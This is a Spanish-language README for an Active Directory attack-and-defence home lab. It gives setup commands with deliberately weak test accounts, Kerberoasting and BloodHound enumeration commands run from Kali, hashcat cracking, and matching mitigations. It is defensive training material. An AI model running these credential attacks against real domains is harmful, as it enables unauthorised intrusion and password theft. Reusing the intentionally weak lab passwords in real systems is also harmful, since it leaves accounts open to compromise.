# Active Directory Home Lab 🏴

Entorno de laboratorio virtualizado para practicar técnicas de ataque y defensa sobre Active Directory.  
Todo ejecutado en máquinas locales — entorno 100% controlado, sin sistemas reales implicados.

> ⚠️ **Disclaimer:** Este proyecto es exclusivamente educativo. Los ataques documentados se ejecutan únicamente en este entorno aislado. Nunca uses estas técnicas en sistemas sin autorización expresa.

---

## 🗺️ Arquitectura del laboratorio

```
┌─────────────────────────────────────────────────┐
│                RED INTERNA (NAT)                │
│                 172.16.0.0/24                   │
│                                                 │
│  ┌──────────────────┐    ┌───────────────────┐  │
│  │  DC01            │    │  WS01 / WS02      │  │
│  │  Windows Server  │    │  Windows 10       │  │
│  │  2022            │    │  (víctimas)       │  │
│  │  172.16.0.10     │    │  172.16.0.20/21   │  │
│  │  AD DS · DNS     │    │                   │  │
│  └──────────────────┘    └───────────────────┘  │
│                                                 │
│  ┌──────────────────┐                           │
│  │  KALI            │                           │
│  │  Kali Linux      │                           │
│  │  172.16.0.100    │                           │
│  │  (atacante)      │                           │
│  └──────────────────┘                           │
└─────────────────────────────────────────────────┘
```

---

## 🛠️ Requisitos

- VirtualBox 7.x o VMware Workstation
- Mínimo 16 GB RAM (recomendado)
- ISO Windows Server 2022 (evaluación gratuita — Microsoft)
- ISO Windows 10 (evaluación gratuita — Microsoft)
- Kali Linux (descarga oficial — kali.org)

---

## ⚙️ Setup paso a paso

### 1. Configurar el Domain Controller

```powershell
# Instalar rol AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promover a DC
Install-ADDSForest -DomainName "lab.local" -InstallDns
```

### 2. Crear usuarios de prueba en el dominio

```powershell
# Usuario normal (objetivo de ataques)
New-ADUser -Name "John Smith" -SamAccountName "jsmith" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true

# Usuario con SPN (objetivo de Kerberoasting)
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
  -AccountPassword (ConvertTo-SecureString "Service123!" -AsPlainText -Force) `
  -Enabled $true

Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.lab.local:1433"}
```

### 3. Unir las workstations al dominio

```powershell
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
```

---

## ⚔️ Ataques documentados

| Técnica | Herramienta | Estado |
|---------|-------------|--------|
| Enumeración AD | BloodHound + SharpHound | ✅ Documentado |
| Kerberoasting | Impacket / Rubeus | ✅ Documentado |
| Pass-the-Hash | CrackMapExec | 🔄 En progreso |
| AS-REP Roasting | Impacket | 📋 Pendiente |
| DCSync | Impacket secretsdump | 📋 Pendiente |

---

### 🔍 Enumeración con BloodHound

```bash
# Desde Kali — recopilar datos del dominio
bloodhound-python -u jsmith -p 'Password123!' -d lab.local -ns 172.16.0.10 -c all

# Iniciar Neo4j y BloodHound
sudo neo4j start
bloodhound
```

### 🎯 Kerberoasting

```bash
# Solicitar tickets de servicios con SPN
impacket-GetUserSPNs lab.local/jsmith:'Password123!' -dc-ip 172.16.0.10 -request

# Crackear el hash con hashcat
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🛡️ Mitigaciones

Cada técnica documentada incluye su contramedida:

- **Kerberoasting** → contraseñas de cuentas de servicio largas (+25 caracteres) y uso de gMSA
- **Pass-the-Hash** → deshabilitar NTLM donde sea posible, activar Credential Guard
- **BloodHound / enumeración** → principio de mínimo privilegio, revisar ACLs del dominio

---

## 📚 Referencias

- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [SpecterOps — BloodHound](https://bloodhoundad.com)
- [Impacket — GitHub](https://github.com/fortra/impacket)
